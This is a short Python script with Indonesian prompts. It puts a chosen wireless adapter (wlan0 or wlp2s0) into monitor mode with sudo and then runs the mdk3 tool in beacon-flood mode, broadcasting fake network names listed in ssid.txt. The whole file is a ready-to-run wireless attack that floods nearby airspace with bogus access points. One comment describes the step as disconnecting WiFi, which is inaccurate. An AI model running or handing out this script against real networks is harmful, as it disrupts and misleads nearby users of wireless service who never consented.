'''
 * Copyright (C)2019 - Achmad Chun-Chun Winata Adi <anonychun@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
'''

import os

os.system('iwconfig')
print("1. wlan0")
print("2. wlp2s0")
wlan = int(input("\nPilih interface WiFi [1/2]? : "))

print("Sedang Melakukan Proses Membuat WiFi / SSID . . .\n")

if wlan == 1:
	# proses membuat adapter type monitor
	os.system('sudo iw wlan0 interface add mon0 type monitor')
	# proses disconnect WiFi
	os.system('sudo mdk3 mon0 b -f ssid.txt')
	os.system('clear')
if wlan == 2:
	# proses membuat adapter type monitor
	os.system('sudo iw wlp2s0 interface add mon0 type monitor')
	# proses disconnect WiFi
	os.system('sudo mdk3 mon0 b -f ssid.txt')
	os.system('clear')